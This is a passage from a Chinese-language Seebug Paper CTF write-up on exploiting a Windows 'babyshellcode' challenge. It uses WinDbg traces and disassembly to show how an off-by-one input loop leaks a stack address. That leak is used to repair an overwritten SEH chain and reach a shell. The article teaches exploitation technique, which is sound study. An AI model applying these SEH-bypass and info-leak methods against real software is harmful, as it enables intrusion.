<span class="n">eip</span><span class="o">=</span><span class="mi">7771</span><span class="n">ea8a</span> <span class="n">esp</span><span class="o">=</span><span class="mi">030</span><span class="n">ff1bc</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">030</span><span class="n">ff1c8</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">nz</span> <span class="n">ac</span> <span class="n">po</span> <span class="n">cy</span>

<span class="n">cs</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">002</span><span class="n">b</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">002</span><span class="n">b</span>  <span class="n">es</span><span class="o">=</span><span class="mi">002</span><span class="n">b</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">0053</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">002</span><span class="n">b</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000213</span>

<span class="n">ntdll</span><span class="o">!</span><span class="n">RtlpIsValidExceptionChain</span><span class="o">+</span><span class="mh">0x3c</span><span class="o">:</span>

<span class="mi">7771</span><span class="n">ea8a</span> <span class="mi">8</span><span class="n">d53f8</span>          <span class="n">lea</span>     <span class="n">edx</span><span class="o">,[</span><span class="n">ebx</span><span class="o">-</span><span class="mi">8</span><span class="o">]</span>

<span class="mi">0</span><span class="o">:</span><span class="mi">000</span><span class="o">&gt;</span> <span class="n">p</span>

<span class="n">eax</span><span class="o">=</span><span class="mi">030</span><span class="n">ff7b4</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">03100000</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">61616161</span> <span class="n">edx</span><span class="o">=</span><span class="mi">030</span><span class="n">ffff8</span> <span class="n">esi</span><span class="o">=</span><span class="mi">61616161</span> <span class="n">edi</span><span class="o">=</span><span class="mi">030</span><span class="n">fd000</span>

<span class="n">eip</span><span class="o">=</span><span class="mi">7771</span><span class="n">ea8d</span> <span class="n">esp</span><span class="o">=</span><span class="mi">030</span><span class="n">ff1bc</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">030</span><span class="n">ff1c8</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">nz</span> <span class="n">ac</span> <span class="n">po</span> <span class="n">cy</span>

<span class="n">cs</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">002</span><span class="n">b</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">002</span><span class="n">b</span>  <span class="n">es</span><span class="o">=</span><span class="mi">002</span><span class="n">b</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">0053</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">002</span><span class="n">b</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000213</span>

<span class="n">ntdll</span><span class="o">!</span><span class="n">RtlpIsValidExceptionChain</span><span class="o">+</span><span class="mh">0x3f</span><span class="o">:</span>

<span class="mi">7771</span><span class="n">ea8d</span> <span class="n">ebd6</span>            <span class="n">jmp</span>     <span class="n">ntdll</span><span class="o">!</span><span class="n">RtlpIsValidExceptionChain</span><span class="o">+</span><span class="mh">0x17</span> <span class="o">(</span><span class="mi">7771</span><span class="n">ea65</span><span class="o">)</span>

<span class="mi">0</span><span class="o">:</span><span class="mi">000</span><span class="o">&gt;</span> <span class="n">p</span>

<span class="n">eax</span><span class="o">=</span><span class="mi">030</span><span class="n">ff7b4</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">03100000</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">61616161</span> <span class="n">edx</span><span class="o">=</span><span class="mi">030</span><span class="n">ffff8</span> <span class="n">esi</span><span class="o">=</span><span class="mi">61616161</span> <span class="n">edi</span><span class="o">=</span><span class="mi">030</span><span class="n">fd000</span>

<span class="n">eip</span><span class="o">=</span><span class="mi">7771</span><span class="n">ea65</span> <span class="n">esp</span><span class="o">=</span><span class="mi">030</span><span class="n">ff1bc</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">030</span><span class="n">ff1c8</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">nz</span> <span class="n">ac</span> <span class="n">po</span> <span class="n">cy</span>

<span class="n">cs</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">002</span><span class="n">b</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">002</span><span class="n">b</span>  <span class="n">es</span><span class="o">=</span><span class="mi">002</span><span class="n">b</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">0053</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">002</span><span class="n">b</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000213</span>

<span class="n">ntdll</span><span class="o">!</span><span class="n">RtlpIsValidExceptionChain</span><span class="o">+</span><span class="mh">0x17</span><span class="o">:</span>

<span class="mi">7771</span><span class="n">ea65</span> <span class="mi">3</span><span class="n">bc1</span>            <span class="n">cmp</span>     <span class="n">eax</span><span class="o">,</span><span class="n">ecx</span><span class="c1">//ecx寄存器存放的是栈里被覆盖的，eax存放的是正常的pointer to next chain</span>
</pre></div>


<p>可以看到这里检测是不通过的，因此造成了 crash，所以，我们需要对 seh chain 进行 fix，把 pointer to next chain 修改成下一个 seh chain 的栈地址，这就需要我们获取当前的栈地址，栈地址是自动动态申请和回收的，和堆不一样，因此每次栈地址都会发生变化，我们需要一个 stack info leak。</p>
<p>于是我们在程序中找到了这样一个 stack info leak 的漏洞，开头有个 stack info leak，在最开始的位置。</p>
<div class="codehilite"><pre><span></span>  v1 = getchar();

  do

  {

    if ( v1 == 10 )

      break;

    *((_BYTE *)&amp;v5 + v0++) = v1;

    v1 = getchar();

  }

  while ( v0 != 300 );

  sub_4017C0(&quot;hello %s\n&quot;, &amp;v5);





0:000&gt; g//一字节一字节写入，esi是计数器，ebp-18h是指向拷贝目标的指针

Breakpoint 0 hit

eax=00000061 ebx=7ffde000 ecx=574552e0 edx=00000061 esi=00000000 edi=005488a8

eip=000a16a4 esp=0036f90c ebp=0036f938 iopl=0         nv up ei pl nz ac po nc

cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000212

babyshellcode+0x16a4:

000a16a4 884435e8        mov     byte ptr [ebp+esi-18h],al  ss:0023:0036f920=00

0:000&gt; p

eax=00000061 ebx=7ffde000 ecx=574552e0 edx=00000061 esi=00000000 edi=005488a8

eip=000a16a8 esp=0036f90c ebp=0036f938 iopl=0         nv up ei pl nz ac po nc

cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000212

babyshellcode+0x16a8:

000a16a8 46              inc     esi

0:000&gt; p//获取下一字节

eax=00000061 ebx=7ffde000 ecx=574552e0 edx=00000061 esi=00000001 edi=005488a8

eip=000a16a9 esp=0036f90c ebp=0036f938 iopl=0         nv up ei pl nz na po nc

cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202

babyshellcode+0x16a9:

*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Users\sh1\Desktop\ucrtbase.DLL - 

000a16a9 ff15e4300a00    call    dword ptr [babyshellcode+0x30e4 (000a30e4)] ds:0023:000a30e4={ucrtbase!getchar (5740b260)}

0:000&gt; p//判断长度

eax=00000061 ebx=7ffde000 ecx=574552e0 edx=574552e0 esi=00000001 edi=005488a8

eip=000a16af esp=0036f90c ebp=0036f938 iopl=0         nv up ei pl zr na pe nc

cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246

babyshellcode+0x16af:

000a16af 81fe2c010000    cmp     esi,12Ch

0:000&gt; p

eax=00000061 ebx=7ffde000 ecx=574552e0 edx=574552e0 esi=00000001 edi=005488a8

eip=000a16b5 esp=0036f90c ebp=0036f938 iopl=0         nv up ei ng nz ac po cy

cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000293

babyshellcode+0x16b5:

000a16b5 75e9            jne     babyshellcode+0x16a0 (000a16a0)         [br=1]

0:000&gt; p//判断是否是回车

eax=00000061 ebx=7ffde000 ecx=574552e0 edx=574552e0 esi=00000001 edi=005488a8

eip=000a16a0 esp=0036f90c ebp=0036f938 iopl=0         nv up ei ng nz ac po cy

cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000293

babyshellcode+0x16a0:

000a16a0 3c0a            cmp     al,0Ah

0:000&gt; p

eax=00000061 ebx=7ffde000 ecx=574552e0 edx=574552e0 esi=00000001 edi=005488a8

eip=000a16a2 esp=0036f90c ebp=0036f938 iopl=0         nv up ei pl nz ac po nc

cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000212

babyshellcode+0x16a2:

000a16a2 7413            je      babyshellcode+0x16b7 (000a16b7)         [br=0]

0:000&gt; p//继续写入

Breakpoint 0 hit

eax=00000061 ebx=7ffde000 ecx=574552e0 edx=574552e0 esi=00000001 edi=005488a8

eip=000a16a4 esp=0036f90c ebp=0036f938 iopl=0         nv up ei pl nz ac po nc

cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000212

babyshellcode+0x16a4:

000a16a4 884435e8        mov     byte ptr [ebp+esi-18h],al  ss:0023:0036f921=00
</pre></div>


<p>这里判断的长度是 0x12C，也就是 300，但实际上拷贝目标 ebp-18 很短，而 esi 会不断增加，而没有做控制，最关键的是这个过程。</p>
<div class="codehilite"><pre><span></span><span class="nl">.text:</span><span class="err">004016</span><span class="nf">A4</span> <span class="c">; 20:     *((_BYTE *)&amp;v5 + v0++) = v1;</span>

<span class="nl">.text:</span><span class="err">004016</span><span class="nf">A4</span>                 <span class="no">mov</span>     <span class="no">byte</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">ebp</span><span class="err">+</span><span class="no">esi</span><span class="err">+</span><span class="no">var_18</span><span class="p">],</span> <span class="no">al</span>

<span class="nl">.text:</span><span class="err">004016</span><span class="nf">A8</span> <span class="c">; 21:     v1 = getchar();</span>

<span class="nl">.text:</span><span class="err">004016</span><span class="nf">A8</span>                 <span class="no">inc</span>     <span class="no">esi</span><span class="err">//</span><span class="no">key</span><span class="err">！！</span>

<span class="nl">.text:</span><span class="err">004016</span><span class="nf">A9</span>                 <span class="no">call</span>    <span class="no">ds</span><span class="p">:</span><span class="no">getchar</span>

<span class="nl">.text:</span><span class="err">004016</span><span class="nf">AF</span> <span class="c">; 23:   while ( v0 != 300 );</span>

<span class="nl">.text:</span><span class="err">004016</span><span class="nf">AF</span>                 <span class="no">cmp</span>     <span class="no">esi</span><span class="p">,</span> <span class="mi">12</span><span class="no">Ch</span>
</pre></div>


<p>这里是在赋值结束之后，才将 esi 自加1，然后才去做长度判断，然后再跳转去做是否回车的判断，如果回车则退出，也就是说，这里会多造成4字节的内存泄漏，我们来看一下赋值过程中的内存情况。</p>
<div class="codehilite"><pre><span></span><span class="mi">0</span><span class="o">:</span><span class="mi">000</span><span class="o">&gt;</span> <span class="n">dd</span> <span class="n">ebp</span><span class="o">-</span><span class="mi">18</span> <span class="n">l7</span>

<span class="mi">0036</span><span class="n">f920</span>  <span class="mi">00000061</span> <span class="mi">00000000</span> <span class="mi">00000000</span> <span class="mi">00000000</span>

<span class="mi">0036</span><span class="n">f930</span>  <span class="mi">00000000</span> <span class="mi">1</span><span class="n">ea6b8ab</span> <span class="mi">0036</span><span class="n">f980</span>
</pre></div>


<p>可以看到，在 0036f920 地址便宜 +0x18 的位置存放着一个栈地址，也就是说，如果我们让 name 的长度覆盖到 0036f938 位置的时候，多泄露的4字节是一个栈地址，这样我们就可以用来 fix seh stack 了。</p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/08/aa2005f1-82b6-4166-96f1-1b9b8ff7b181.png-w331s" /></p>
<p>有了这个内存泄漏，我们就可以重新构造栈布局了，栈布局如下：</p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/08/8558714c-8eaf-4b28-a2d1-6ff246014ede.png-w331s" /></p>
<p>这样，结合之前我们的整个利用过程，完成整个利用链，最后完成shell交互。</p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/08/331f748c-7f9a-42d0-8926-069b119905b4.jpg-w331s" /></p>
      
<hr>
<p><img src="https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg" alt="Paper" style="width: 220px">
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<a href="https://paper.seebug.org/378/">https://paper.seebug.org/378/</a></p>
            
    </section>

  <nav class="pagination" role="navigation" style="padding: 3rem;">
    
      <a class="newer-posts" href="/377/"><span aria-hidden="true">&larr;</span> Xshell 高级后门完整分析报告</a>
    
    
      <a class="older-posts" href="/379/">HITB GSEC CTF WIN PWN解题全记录之... <span aria-hidden="true">&rarr;</span></a>
    
  </nav>


    

      
        <footer class="post-footer">
          <figure class="author-image">
            <a class="img" href="/users/author/?nickname=k0shl"
               style="background-image: url(https://images.seebug.org/uploads/2017/08/005PzhAMjw8f81c3d8m10j30jg0hawhb.jpg)"><span
                class="hidden">'s Picture</span></a>
          </figure>

          <section class="author">
            <h4><a
                href="/users/author/?nickname=k0shl">k0shl</a>
            </h4>
            <p>阅读更多有关<a
                href="/users/author/?nickname=k0shl">该作者</a>的文章
            </p>
            
            <div class="author-meta">
            </div>
          </section>

          
          
          
          
          
          
          
          
          
          
          
          
          
          
          
          
          
          
          
          
          

        </footer>
      
    
    <br>
    <section class="plugin_comment">
    </section>

  </article>
  <section class="plugin_feedback"></section>


  </div>
</main>
</div>

<script type="text/javascript" src="/static/js/jquery.min.js"></script>
<script type="text/javascript" src="/static/js/jquery.fitvids.js"></script>
<script type="text/javascript" src="/static/js/index.js"></script>
<script type="text/javascript" src="/static/js/prism-loader.js"></script>
<script type="text/javascript" src="/static/js/prism.js"></script>
<script type="text/javascript" src="/static/js/jquery.ghostHunter.js"></script>
<script type="text/javascript" src="/static/js/js.cookie.js"></script>
<script type="text/javascript" src="/static/js/custom.js?t=20170821"></script>
<script type="text/javascript" src="https://www.seebug.org/static/dist2/scripts/comment_main.js"></script>
<script type="text/javascript" src="https://www.seebug.org/static/dist2/scripts/plugin_feedback.js"></script>
</body>

</html>
